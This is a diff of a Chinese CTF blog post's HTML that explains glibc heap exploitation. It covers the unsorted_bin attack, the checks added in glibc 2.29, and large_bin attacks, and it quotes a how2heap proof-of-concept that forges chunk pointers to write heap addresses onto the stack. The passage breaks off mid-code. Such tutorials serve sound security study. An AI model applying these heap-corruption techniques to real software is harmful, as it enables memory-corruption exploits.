@@ -1,268 +1,153 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
-  <link rel="icon" href="/img/avatar.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="gxh">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="unsorted_bin attack先写一下可以利用的版本吧，也就是GLIBC2.23-GLIBC2.28,我们可以看一下源代码这一段 12345&#x2F;* remove from unsorted list *&#x2F;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))  malloc_printerr (&quot;malloc(): corrupted unsort">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>任意地址写较大数总结 | gxh's blog</title><meta name="author" content="gxh"><meta name="copyright" content="gxh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="unsorted_bin attack先写一下可以利用的版本吧，也就是GLIBC2.23-GLIBC2.28,我们可以看一下源代码这一段 12345&#x2F;* remove from unsorted list *&#x2F;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))  malloc_printerr (&quot;malloc(): corrupted unsort">
 <meta property="og:type" content="article">
 <meta property="og:title" content="任意地址写较大数总结">
 <meta property="og:url" content="http://gxher.github.io/2022/07/01/Large_ubsorted/index.html">
 <meta property="og:site_name" content="gxh&#39;s blog">
 <meta property="og:description" content="unsorted_bin attack先写一下可以利用的版本吧，也就是GLIBC2.23-GLIBC2.28,我们可以看一下源代码这一段 12345&#x2F;* remove from unsorted list *&#x2F;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))  malloc_printerr (&quot;malloc(): corrupted unsort">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg">
 <meta property="article:published_time" content="2022-07-01T10:30:16.240Z">
-<meta property="article:modified_time" content="2022-08-08T10:10:20.594Z">
+<meta property="article:modified_time" content="2022-09-11T09:25:58.857Z">
 <meta property="article:author" content="gxh">
-<meta name="twitter:card" content="summary_large_image">
-  
-  
-  
-  <title>任意地址写较大数总结 - gxh&#39;s blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"gxher.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/gxher/blog-img/avatar.jpg"><link rel="canonical" href="http://gxher.github.io/2022/07/01/Large_ubsorted/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
     }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '任意地址写较大数总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-11 17:25:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-<meta name="generator" content="Hexo 6.2.0"></head>
-
-
-<body>
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-
-  <header>
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>gxh&#39;s blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/back.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="任意地址写较大数总结"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-01 18:30" pubdate>
-          2022年7月1日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          7.5k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          63 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">任意地址写较大数总结</h1>
-            
-            <div class="markdown-body">
-              
-              <h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin attack"></a>unsorted_bin attack</h2><p>先写一下可以利用的版本吧，也就是GLIBC2.23-GLIBC2.28,我们可以看一下源代码这一段</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure>
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="gxh's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/gxher/blog-img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/gxher/blog-img/6.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">gxh's blog</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">任意地址写较大数总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-01T10:30:16.240Z" title="发表于 2022-07-01 18:30:16">2022-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-11T09:25:58.857Z" title="更新于 2022-09-11 17:25:58">2022-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="任意地址写较大数总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin attack"></a>unsorted_bin attack</h2><p>先写一下可以利用的版本吧，也就是GLIBC2.23-GLIBC2.28,我们可以看一下源代码这一段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
 
 <p>这个攻击其实是用在摘链的时候，如果我们可以控制 unsorted_bin中的bk指针，我们可以写入任意地址（姑且称为target），当我们malloc掉这个unsorted_chunk时，我们的target+0x10地址出就会被修改为 main_arena+offest的地址，其实也就是libc中的地址。效果就是修改任意地址为一个较大的数。</p>
 <p>在GLIBC2.29及以后，int_malloc()函数源码中加入了这段</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">mchunkptr next = chunk_at_offset (victim, size);<br><br>       <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<br>           || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>       <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>       <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>           || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>       <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<br>         malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">           || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>​	malloc时增加了以下四项检查：</p>
 <ul>
@@ -273,7 +158,7 @@
 </ul>
 <p>也就是说，在2.29以后unsorted_bin attack基本也退出历史舞台了，很少能用的到了，基本被large_bin attck所替代了，检查双向链表的完整性，即检擦了victim的fd,也检查了bck的fd，所以要想使用这个手法，要提前知道heap地址和libc地址才可以。</p>
 <p>此外，house of force 在2.29以后也退出了历史舞台，原因是增加了</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<span class="hljs-comment">//0x21000</span><br>        malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<span class="comment">//0x21000</span></span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure>
 
 <p>需要检查top_chunk的size,需要小于等于 system_mems,所以基本失效了。</p>
 <h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin attack"></a>large_bin attack</h2><p>large_bin attack主要是在unsorted—bin里的chunk，进入large_bin的时候，出现的问题，一共两种常见的利用方式。</p>
@@ -283,418 +168,36 @@
 <li><p>在largebin插入的过程中，伪造largebin的bk_nextsize以及bk，实现任意地址写堆地址。</p>
 </li>
 </ul>
-<h3 id="申请时利用："><a href="#申请时利用：" class="headerlink" title="申请时利用："></a>申请时利用：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((victim = first (bin)) != bin<br>          &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (victim)<br>            &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>              victim = victim-&gt;bk_nextsize;<br>              <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize; <span class="hljs-comment">//寻找堆块</span><br>                <br>......<br>​<br>              remainder_size = size - nb;<br>              unlink (av, victim, bck, fwd); <span class="hljs-comment">//unlin</span><br></code></pre></td></tr></table></figure>
+<h3 id="申请时利用："><a href="#申请时利用：" class="headerlink" title="申请时利用："></a>申请时利用：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">          &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">            &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize; <span class="comment">//寻找堆块</span></span><br><span class="line">                </span><br><span class="line">......</span><br><span class="line">​</span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//unlin</span></span><br></pre></td></tr></table></figure>
 
 <p>只要目标地方符合unlink就可以通过检查了。</p>
 <h3 id="插入时利用（任意地址写入堆地址）"><a href="#插入时利用（任意地址写入堆地址）" class="headerlink" title="插入时利用（任意地址写入堆地址）"></a>插入时利用（任意地址写入堆地址）</h3><p>在我们将chunk1放入large_bin后，我们通过修改chunk1的bk_next_size为target_addr - 0x20，此时 unsorted_bin中有一个large_chunk，我称之为chunk2,但是chunk2的地址size要大于chunk1的size，同时两个size在同一个bin的index范围内。此时我们再malloc任意size的chunk即可将chunk2链入chunk1中去，此时我们target_addr的内容，就会被修改成chunk2的地址。</p>
 <p>看以下how2heap</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -no-pie largebin.c -o largebin</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br> <br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>     <span class="hljs-built_in">free</span>(p1);<br>     <span class="hljs-built_in">free</span>(p2);<br><br>     <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>     <span class="hljs-built_in">free</span>(p3);<br> <br>     p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br>     p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>     p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>     p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br>     p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br> <br>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br><br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g -no-pie 